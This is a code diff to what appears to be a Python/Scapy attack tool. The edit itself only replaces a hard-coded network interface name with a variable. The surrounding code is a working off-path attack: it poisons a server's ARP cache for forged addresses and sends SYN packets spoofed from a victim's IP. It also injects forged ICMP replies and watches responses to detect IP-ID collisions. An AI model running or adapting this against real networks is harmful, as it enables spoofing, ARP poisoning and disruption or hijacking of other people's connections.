@@ -29,7 +29,8 @@ forge_ip_prefix = '10.10.'                  # used for construct a address pool
 victim_ip = '10.10.100.1'                   # victim ip address
 server_ip = '10.10.100.2'                   # server ip address
 server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
-my_mac_addr = get_if_hwaddr('ens33')        # mac address of attacker
+my_if_name = 'ens33'                        # bind one ethernet interface
+my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 NUM_T = 20                                  # number of checking thread
 
@@ -57,12 +58,12 @@ def arp_inject(forged_ip):
     # here we send a UDP packet to allure server to execute ip/mac convert
     # if we got no reply, we can deduce that arp poisoned before is not expired now
     pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
-                iface='ens33', count=1, timeout=0.3, started_callback=
+                iface=my_if_name, count=1, timeout=0.3, started_callback=
                 lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
-                             iface='ens33', verbose=False))
+                             iface=my_if_name, verbose=False))
     if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
         send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-             iface='ens33', verbose=False)
+             iface=my_if_name, verbose=False)
 
 
 """
@@ -87,12 +88,12 @@ def check_collision(forged_ip, D):
         # to reply a SYN-ACK rather than a RST
         semaphore_ipid.acquire()
         pkts = sniff(filter="icmp and dst " + forged_ip,
-                    iface='ens33', count=2, timeout=0.2, started_callback=
+                    iface=my_if_name, count=2, timeout=0.2, started_callback=
                     lambda: send([
                             IP(src=forged_ip, dst=server_ip) / ICMP(),
                             IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
                             IP(src=forged_ip, dst=server_ip) / ICMP()
-                            ], iface='ens33', verbose=False))
+                            ], iface=my_if_name, verbose=False))
         semaphore_ipid.release()
 
         if len(pkts) == 2:
@@ -151,7 +152,7 @@ def check_new():
          IP(flags=2, src=server_ip, dst=victim_ip) /
          ICMP(type=0, code=0) /
          z_payload,
-         iface='ens33', verbose=False)
+         iface=my_if_name, verbose=False)
 
     if check_collision(forge_ip, 1):
         # when an address is suspected of collision, we check it again and again
